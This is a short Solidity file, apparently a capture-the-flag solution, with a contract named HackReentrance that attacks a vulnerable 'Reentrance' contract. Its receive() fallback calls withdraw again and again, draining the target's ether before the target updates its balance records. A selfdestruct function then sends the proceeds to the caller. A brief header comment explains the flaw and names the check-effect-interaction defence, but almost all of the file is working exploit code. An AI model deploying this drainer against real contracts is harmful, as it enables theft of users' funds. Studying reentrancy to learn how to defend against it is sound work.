//  SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.15;

/**
    @title Hacker contract for Reentrance
    @notice Since the effect of the balance is changed only after sending the balance, it's possible to use the fallback of an external contract to keep calling the function.
            The call will continue to pass the check since it never reaches the code to make the change to the balance.
            To protect against re-entrancy, we use check-effect-interaction pattern.
*/


interface Reentrance {
    function donate(address _to) external payable; 
    function withdraw(uint) external;
}

contract HackReentrance {
    Reentrance toHack;
    uint calls;

    constructor(address _toHack) {
        toHack = Reentrance(_toHack);
    }

    function donate() external payable {
        toHack.donate{value:msg.value}(address(this));
    }

    function emptyContract(uint256 _amount) external {
        toHack.withdraw(_amount);
    }

    function withdrawal() external {
        selfdestruct(payable(msg.sender));
    }

    receive() external payable {
        if (address(toHack).balance > 0) {
            toHack.withdraw(msg.value);
        }
    }
}
